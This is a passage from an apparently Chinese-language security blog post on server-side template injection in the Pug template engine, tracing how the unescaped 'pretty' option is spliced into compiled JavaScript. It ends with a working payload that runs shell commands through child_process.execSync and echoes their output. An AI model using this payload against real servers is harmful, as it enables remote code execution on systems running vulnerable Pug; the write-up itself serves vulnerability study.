class=\"attr\">instances</span>: []&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mixin.<span class=\"property\">call</span>) &#123;</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">mixins</span>[key].<span class=\"property\">used</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (pp)</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">buf</span>.<span class=\"title function_\">push</span>(</span><br><span class=\"line\">          <span class=\"string\">&quot;pug_indent.push(&#x27;&quot;</span> + <span class=\"title class_\">Array</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">indents</span> + <span class=\"number\">1</span>).<span class=\"title function_\">join</span>(pp) + <span class=\"string\">&quot;&#x27;);&quot;</span></span><br><span class=\"line\">        );</span><br><span class=\"line\"><span class=\"comment\">// 省略</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>上面也是一樣的情況，因此可以改 <code>this.pp</code> 的值就可以拼接惡意的 code 了</li>\n<li><code>this.pp = options.pretty || false; </code> 所以說只要給 pretty 參數就可以了</li>\n<li>那至於說為什麼會呼叫到這兩個 functions</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">compile</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">buf</span> = [];</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">pp</span>) <span class=\"variable language_\">this</span>.<span class=\"property\">buf</span>.<span class=\"title function_\">push</span>(<span class=\"string\">&#x27;var pug_indent = [];&#x27;</span>);</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">lastBufferedIdx</span> = -<span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"title function_\">visit</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">node</span>);</span><br><span class=\"line\"><span class=\"comment\">// 省略</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>可以看到在呼叫了 <code>visit</code> function</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">visit</span>: <span class=\"keyword\">function</span>(<span class=\"params\">node, parent</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> debug = <span class=\"variable language_\">this</span>.<span class=\"property\">debug</span>;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 省略</span></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"title function_\">visitNode</span>(node);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">visitNode</span>: <span class=\"keyword\">function</span>(<span class=\"params\">node</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable language_\">this</span>[<span class=\"string\">&#x27;visit&#x27;</span> + node.<span class=\"property\">type</span>](node);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>因為他最後會呼叫 <code>visitNode</code> 並且 <code>node.type</code> 會是那些 function 的字串，所以會拼成 <code>visitMixin</code> 、<code>visitMixin</code> 之類的，也就會呼叫到這些 functions 啦</p>\n</li>\n<li>\n<p>完整拼出來的 code 長這樣</p>\n</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">template</span>(<span class=\"params\">locals</span>) &#123;<span class=\"keyword\">var</span> pug_html = <span class=\"string\">&quot;&quot;</span>, pug_mixins = &#123;&#125;, pug_interp;<span class=\"keyword\">var</span> pug_debug_filename, pug_debug_line;<span class=\"keyword\">try</span> &#123;;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> locals_for_with = (locals || &#123;&#125;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    (<span class=\"keyword\">function</span> (<span class=\"params\">pug_indent, text</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> pug_indent = [];</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">1</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fecho.pug&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\u003C!DOCTYPE html\\u003E&quot;</span>;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">2</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fecho.pug&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\n\\u003Chtml\\u003E&quot;</span>;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">1</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fmixins.pug&quot;</span>;</span><br><span class=\"line\">pug_mixins[<span class=\"string\">&quot;head&quot;</span>] = pug_interp = <span class=\"keyword\">function</span>(<span class=\"params\">title</span>)&#123;</span><br><span class=\"line\"><span class=\"keyword\">var</span> block = (<span class=\"variable language_\">this</span> &amp;&amp; <span class=\"variable language_\">this</span>.<span class=\"property\">block</span>), attributes = (<span class=\"variable language_\">this</span> &amp;&amp; <span class=\"variable language_\">this</span>.<span class=\"property\">attributes</span>) || &#123;&#125;;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">2</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fmixins.pug&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\nasdf&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + pug_indent.<span class=\"title function_\">join</span>(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\u003Chead\\u003E&quot;</span>;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">3</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fmixins.pug&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\nasdfasdf&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + pug_indent.<span class=\"title function_\">join</span>(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\u003Ctitle\\u003E&quot;</span>;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">3</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fmixins.pug&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + (pug.<span class=\"built_in\">escape</span>(<span class=\"literal\">null</span> == (pug_interp = title) ? <span class=\"string\">&quot;&quot;</span> : pug_interp)) + <span class=\"string\">&quot;\\u003C\\u002Ftitle\\u003E&quot;</span>;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">4</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fmixins.pug&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (block) &#123;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">5</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fmixins.pug&quot;</span>;</span><br><span class=\"line\">pug_indent.<span class=\"title function_\">push</span>(<span class=\"string\">&#x27;asdfasdf&#x27;</span>);</span><br><span class=\"line\">block &amp;&amp; <span class=\"title function_\">block</span>();</span><br><span class=\"line\">pug_indent.<span class=\"title function_\">pop</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\nasdf&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + pug_indent.<span class=\"title function_\">join</span>(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\u003C\\u002Fhead\\u003E&quot;</span>;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">7</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fmixins.pug&quot;</span>;</span><br><span class=\"line\">pug_mixins[<span class=\"string\">&quot;body&quot;</span>] = pug_interp = <span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\"><span class=\"keyword\">var</span> block = (<span class=\"variable language_\">this</span> &amp;&amp; <span class=\"variable language_\">this</span>.<span class=\"property\">block</span>), attributes = (<span class=\"variable language_\">this</span> &amp;&amp; <span class=\"variable language_\">this</span>.<span class=\"property\">attributes</span>) || &#123;&#125;;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">8</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fmixins.pug&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\nasdf&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + pug_indent.<span class=\"title function_\">join</span>(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\u003Cbody\\u003E&quot;</span>;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">9</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fmixins.pug&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (block) &#123;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">10</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fmixins.pug&quot;</span>;</span><br><span class=\"line\">pug_indent.<span class=\"title function_\">push</span>(<span class=\"string\">&#x27;asdfasdf&#x27;</span>);</span><br><span class=\"line\">block &amp;&amp; <span class=\"title function_\">block</span>();</span><br><span class=\"line\">pug_indent.<span class=\"title function_\">pop</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">12</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fmixins.pug&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\nasdfasdf&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + pug_indent.<span class=\"title function_\">join</span>(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\u003Ch3\\u003E&quot;</span>;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">12</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fmixins.pug&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;404 not found\\u003C\\u002Fh3\\u003E&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\nasdf&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + pug_indent.<span class=\"title function_\">join</span>(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\u003C\\u002Fbody\\u003E&quot;</span>;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">5</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fecho.pug&quot;</span>;</span><br><span class=\"line\">pug_indent.<span class=\"title function_\">push</span>(<span class=\"string\">&#x27;asdf&#x27;</span>);</span><br><span class=\"line\">pug_mixins[<span class=\"string\">&quot;head&quot;</span>](text);</span><br><span class=\"line\">pug_indent.<span class=\"title function_\">pop</span>();</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">6</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fecho.pug&quot;</span>;</span><br><span class=\"line\">pug_indent.<span class=\"title function_\">push</span>(<span class=\"string\">&#x27;asdf&#x27;</span>);</span><br><span class=\"line\">pug_mixins[<span class=\"string\">&quot;body&quot;</span>].<span class=\"title function_\">call</span>(&#123;</span><br><span class=\"line\"><span class=\"attr\">block</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">7</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fecho.pug&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + pug_indent.<span class=\"title function_\">join</span>(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\u003Cp\\u003E&quot;</span>;</span><br><span class=\"line\">;pug_debug_line = <span class=\"number\">7</span>;pug_debug_filename = <span class=\"string\">&quot;\\u002Fusr\\u002Fsrc\\u002Fapp\\u002Fviews\\u002Fecho.pug&quot;</span>;</span><br><span class=\"line\">pug_html = pug_html + (pug.<span class=\"built_in\">escape</span>(<span class=\"literal\">null</span> == (pug_interp = text) ? <span class=\"string\">&quot;&quot;</span> : pug_interp)) + <span class=\"string\">&quot;\\u003C\\u002Fp\\u003E&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">pug_indent.<span class=\"title function_\">pop</span>();</span><br><span class=\"line\">pug_html = pug_html + <span class=\"string\">&quot;\\n\\u003C\\u002Fhtml\\u003E&quot;</span>;</span><br><span class=\"line\">    &#125;.<span class=\"title function_\">call</span>(<span class=\"variable language_\">this</span>, <span class=\"string\">&quot;pug_indent&quot;</span> <span class=\"keyword\">in</span> locals_for_with ?</span><br><span class=\"line\">        locals_for_with.<span class=\"property\">pug_indent</span> :</span><br><span class=\"line\">        <span class=\"keyword\">typeof</span> pug_indent !== <span class=\"string\">&#x27;undefined&#x27;</span> ? pug_indent : <span class=\"literal\">undefined</span>, <span class=\"string\">&quot;text&quot;</span> <span class=\"keyword\">in</span> locals_for_with ?</span><br><span class=\"line\">        locals_for_with.<span class=\"property\">text</span> :</span><br><span class=\"line\">        <span class=\"keyword\">typeof</span> text !== <span class=\"string\">&#x27;undefined&#x27;</span> ? text : <span class=\"literal\">undefined</span>));</span><br><span class=\"line\">    ;&#125; <span class=\"keyword\">catch</span> (err) &#123;pug.<span class=\"title function_\">rethrow</span>(err, pug_debug_filename, pug_debug_line);&#125;;<span class=\"keyword\">return</span> pug_html;&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>可以看到 <code>pug_indent.push('asdf')</code> 就是 pretty 的內容，這個時候就可以拼接惡意的 code。如果要有回顯的話直接把結果加入到 <code>pug_html</code> 就可以了</li>\n<li>payload:</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">text=a&amp;pretty=asdf<span class=\"string\">&#x27;);pug_html+=global.process.mainModule.constructor._load(%27child_process%27).execSync(%27id%27).toString()//</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>最後可以參考 Cyku 大大的 issue\n<ul>\n<li><a href=\"https://github.com/pugjs/pug/issues/3312\" target=\"_blank\">https://github.com/pugjs/pug/issues/3312</a></li>\n<li>個人覺得已經解釋得很清楚了～</li>\n</ul>\n</li>\n</ul>\n","next":{"title":"NodeJS template CVEs","link":"2023/03/06/NodeJS-template-CVEs"},"plink":"https://entroychang.github.io/2023/03/13/Pug-SSTI/","toc":[{"id":"pug-ssti","title":"Pug SSTI","index":"1","children":[{"id":"pug-ssti-1","title":"Pug SSTI 1","index":"1.1"},{"id":"pug-ssti-2","title":"Pug SSTI 2","index":"1.2"},{"id":"echo2","title":"echo2","index":"1.3"}]}],"reading_time":"2160 words in 14 min"}